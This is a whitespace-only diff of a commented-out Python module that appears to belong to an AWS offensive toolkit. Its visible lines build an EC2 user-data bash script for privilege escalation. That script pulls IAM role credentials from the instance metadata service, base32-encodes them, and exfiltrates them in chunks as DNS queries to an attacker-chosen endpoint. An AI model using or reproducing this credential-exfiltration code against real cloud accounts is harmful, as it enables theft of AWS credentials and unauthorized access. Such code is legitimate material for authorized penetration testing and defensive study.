@@ -1,4 +1,3 @@
-
 # from textwrap import dedent
 # from uuid import uuid4
 
@@ -6,7 +5,7 @@
 
 
 # class Module(AWSModule):
-    
+
 #     OPT_EXFIL_TYPE = 'EXFIL_TYPE'
 #     OPT_TARGET_ROLE = 'TARGET_ROLE'
 #     OPT_EXFIL_TARGET = 'EXFIL_TARGET'
@@ -39,7 +38,7 @@
 #     @property
 #     def search_name(self):
 #         return f'aws/ec2/privesc/{self.name}'
-    
+
 
 #     def get_launch_parameters(self) -> dict:
 
@@ -65,7 +64,7 @@
 #         sg_id = self.get_opt(Module.OPT_SEC_GROUP_ID)
 #         if sg_id: params['SecurityGroupIds'] = [sg_id]
 
-    
+
 #     def build_user_data_script(self) -> str:
 #         '''Generate a user data script with three options to exfiltrate data'''
 
@@ -77,7 +76,7 @@
 #         #     self.print_warning(f'Interpreted HTTP/S exiltration endpoint as {EXFIL_ENDPOINT}')
 #         # else:
 #         #     self.print_status(f'Preparing user data for HTTP/S exfiltration to {EXFIL_ENDPOINT}')
-        
+
 #         user_data_http = dedent(f'''\
 #         #!/bin/bash
 
@@ -92,7 +91,7 @@
 #         CREDENTIALS=$(curl -fsS --max-time 2 -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" "$IMDS_ENDPOINT/latest/meta-data/iam/security-credentials/$IAM_PROFILE" );
 
 #         # Exfiltrate to remote system
-#         BASE32=$(echo $CREDENTIALS | base32 --wrap=0 | tr -d '=');                                
+#         BASE32=$(echo $CREDENTIALS | base32 --wrap=0 | tr -d '=');
 #         EXFIL_LENGTH=${{#BASE32}};
 #         for ((i=0; i<EXFIL_LENGTH; i+=63)); do
 #             CHUNK_FQDN="${{BASE32:i:63}}.{dns_exil_id}.{EXFIL_ENDPOINT}";
